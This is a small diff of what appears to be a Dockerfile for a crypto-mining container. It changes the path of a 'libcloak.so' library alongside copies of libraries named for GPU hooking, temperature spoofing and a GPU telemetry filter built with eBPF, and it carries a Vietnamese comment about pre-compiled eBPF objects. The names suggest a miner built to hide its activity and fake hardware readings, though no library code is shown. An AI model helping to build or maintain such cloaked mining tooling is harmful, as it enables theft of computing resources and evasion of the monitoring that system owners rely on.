@@ -140,7 +140,7 @@ COPY entrypoint.sh /app/entrypoint.sh
 COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
 COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
 COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
-COPY cloaking_lib/libcloak.so /usr/local/lib/libcloak.so
+COPY mining_environment/cpu_plugins/cloaking_lib/libcloak.so /usr/local/lib/libcloak.so
 
 # **QUAN TRỌNG: Copy PRE-COMPILED eBPF objects (KHÔNG build trong container)**
 # GPU telemetry filter moved to gpu_plugins module
